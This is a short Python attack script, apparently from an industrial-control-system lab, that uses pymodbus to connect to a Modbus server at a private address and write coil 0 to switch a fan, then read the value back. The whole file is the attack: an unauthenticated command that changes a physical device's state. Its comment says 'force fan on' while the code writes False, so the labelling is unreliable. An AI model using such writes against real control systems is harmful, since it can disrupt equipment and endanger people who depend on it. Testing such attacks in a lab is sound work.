from pymodbus.client import ModbusTcpClient

'''
    This attack connects directly to the modbus server and changes values.
    For example turning on and off a fan.
'''

# Connect to modbus server.
client = ModbusTcpClient("172.25.213.130", port=5020)
client.connect()

# Force fan on (coil 0)
client.write_coil(0, False)

# Confirm change.
res = client.read_coils(0)
print(f"Response: {res}")
print("Fan status:", res.bits[0])
client.close()